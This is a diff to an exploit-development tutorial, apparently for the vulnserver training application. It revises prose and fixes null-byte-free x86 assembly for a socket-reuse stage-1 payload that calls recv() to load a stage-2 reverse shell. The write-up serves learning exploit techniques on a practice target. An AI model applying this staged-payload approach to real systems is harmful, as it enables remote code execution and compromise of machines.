@@ -63,7 +63,7 @@ The first step is to identify where the `KSTET` command is processed.
 We can do that by right clicking,
 then `Search for -> All referenced text strings`, right click again, then
 `Search for text` and type `KSTET`. Make sure that `Entire scope` is selected.
-Now, select the match on where `KSTET` string is presented and put a
+Now, select the match on where `KSTET` string is presented and set a
 breakpoint:
 
 image::debug1.gif[Debugging KSTET]
@@ -355,19 +355,19 @@ We first we need to know 2 things:
 . The value of the socket handle.
 
 To do that, we can use the debugger again, by right clicking, selecting
-`Search for`, then `All intermodular calls`, look for the call to
-`WS2_32.recv` and put a breakpoint:
+`Search for -> All intermodular calls`, look for the call to
+`WS2_32.recv` and set a breakpoint:
 
 image::recv1.gif[recv() call location]
 
-Now create a new connection. When we hit the breakpoint we will be able
-to check the address of the `recv()` call and the value of the socket handle:
+Now create a new connection:
 
 image::recv2.gif[recv() call]
 
-Wonderful! We can see the parameters on the stack window (bottom right)
-on where we can get the value of the socket handle (`144`). We also got the
-address of the `recv()` function at `0040252C`.
+Wonderful! We can see the parameters of the `recv()` call on
+on the stack window (bottom right) from where we can get the value of the
+socket handle (`144`). We also got the address of the `recv()` function
+at `0040252C`.
 
 With all the needed values, it's time to write some Assembler!
 Remember that we need to avoid null bytes and we have to push the parameters
@@ -384,13 +384,13 @@ push ebx                ; Push `len` parameter = 1024 bytes
 mov ebx,esp		        ; Move the current pointer of ESP into EBX
 add ebx,0x64            ; Point EBX the original ESP to make it the pointer on
                         ; where our stage-2 payload will be received
-push ebx                ; Push `*buf` parameter = Pointer to ESP
+push ebx                ; Push `*buf` parameter = Pointer to ESP+0x64
 xor ebx,ebx             ; Zero out EBX again
 add ebx,0x144           ; Make EBX = 144 that is the value of socket handle
 push ebx                ; Push `s` parameter = 144
-mov eax,40252C41        ; We need to make EAX = 0040252C but we can't inject
-                        ; null bytes. So 40252C41 is shift-left padded
-shr eax,0x8             ; Remove the '41' byte of EAX by shifting right and
+mov eax,0x40252C90      ; We need to make EAX = 0040252C but we can't inject
+                        ; null bytes. So 40252C90 is shift-left padded with 90
+shr eax,0x8             ; Remove the '90' byte of EAX by shifting right and
                         ; making EBX = 0040252C
 call eax                ; Call recv()
 ----
@@ -416,7 +416,7 @@ push ebx                ; Push `len` parameter = 1024 bytes
 mov ebx,esp		        ; Move the current pointer of ESP into EBX
 add ebx,0x64            ; Point EBX the original ESP to make it the pointer on
                         ; where our stage-2 payload will be received
-push ebx                ; Push `*buf` parameter = Pointer to ESP
+push ebx                ; Push `*buf` parameter = Pointer to ESP+0x64
 inc edi                 ; Make EDI = EDI + 1
 push edi                ; Push socket handle `s` parameter = EDI = EDI + 1
 mov eax,0x40252C90      ; We need to make EAX = 0040252C but we can't inject
@@ -425,7 +425,7 @@ shr eax,0x8             ; Remove the '90' byte of EAX by shifting right and
                         ; making EBX = 0040252C
 call eax                ; Call recv()
 test eax,eax            ; Check if our recv() call was successfully made
-jnz socket_loop         ; If recv() failed kump back to the socket loop where
+jnz socket_loop         ; If recv() failed jump back to the socket loop where
                         ; EDI will be increased to check the next socket handle
 ----
 
@@ -497,7 +497,7 @@ Now all that's left is to create a reverse shellcode and send it over our
 stage-1 payload backdoor. As a bonus, as we control the `recv()`
 call, we are not limited by bad chars on the shellcode.
 
-Let's create it
+Let's create it:
 
 [source,bash]
 ----
@@ -613,16 +613,17 @@ with socket.create_connection((HOST, PORT)) as fd:
 
 Several things were added:
 
-. We created a `STAGE2` variable with the shellcode padded the rest of
-the 1024 bytes with NOPs (`\x90`)
-. We added a `time.sleep(3)` to wait for the brute force to get the socket handle
+. We created a `STAGE2` variable with the shellcode and padded the rest of
+the 1024 bytes with NOPs (`\x90`).
+. We added a `time.sleep(3)` to wait for the brute force to get the socket
+handle.
 . And finally we send the stage-2 payload.
 
 Let's see it in action:
 
 image::stage2payload.gif[Stage-2 payload]
 
-Beautiful! As you can see, the shellcode was injected below or execution flow
+Beautiful! As you can see, the shellcode was injected below our execution flow
 so it will be eventually reached and triggered. Let's see if we got the shell:
 
 image::success.gif[Success]
